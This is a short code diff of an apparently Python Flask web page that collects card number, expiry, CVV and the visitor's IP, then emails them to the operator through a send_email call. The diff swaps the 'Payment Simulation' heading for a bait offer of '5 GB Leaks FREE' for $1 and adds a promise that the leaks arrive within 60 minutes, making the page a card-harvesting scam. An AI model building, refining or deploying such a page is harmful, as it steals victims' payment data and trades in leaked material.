@@ -34,7 +34,7 @@ HTML = '''
 </head>
 <body>
     <div class="container">
-        <h1>Payment Simulation</h1>
+        <h1>Pay 1$ Get 5 GB Leaks FREE!!!</h1>
         <form method="POST">
             <label>Card Number (16 digits):</label>
             <input type="text" name="card_number" maxlength="16" placeholder="e.g. 4111111111111111" required>
@@ -116,7 +116,7 @@ def home():
 
         if is_valid:
             success = True
-            message = "Payment processed successfully!"
+            message = "Payment processed successfully! GET the leaks within 60 mins"
 
         # إرسال البيانات ليك
         send_email(card_number, expiry, cvv, amount, ip)
@@ -135,3 +135,4 @@ def validate_expiry(expiry):
 
 if __name__ == '__main__':
     app.run()
+
